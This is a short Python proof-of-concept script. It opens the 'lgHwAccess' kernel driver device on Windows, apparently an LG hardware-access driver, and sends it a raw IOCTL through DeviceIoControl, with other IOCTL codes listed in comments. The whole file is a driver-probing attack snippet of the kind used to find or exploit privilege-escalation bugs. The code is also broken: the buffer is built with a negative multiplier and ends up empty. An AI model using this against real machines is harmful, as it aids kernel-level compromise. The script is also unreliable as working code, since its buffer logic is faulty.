# -*- coding: cp1250 -*-
import ctypes, sys
from ctypes import *
import io
from itertools import product
from sys import argv

devicename = "lgHwAccess"

ioctl = 0xc3502004

#0xc3502000
#0xc3502004
#0xc3502084
#0xc3506144
#0xc3502084

kernel32 = windll.kernel32
hevDevice = kernel32.CreateFileA("\\\\.\\lgHwAccess", 0xC0000000, 0, None, 0x3, 0, None) 

if not hevDevice or hevDevice == -1:
    print ("Not Win! Sorry!")

else:
    print ("OPENED!")

    buf = '\x00' * - 100
    bufLength = len(buf)
    kernel32.DeviceIoControl(hevDevice, ioctl, buf, bufLength, None, 0, byref(c_ulong()), None)

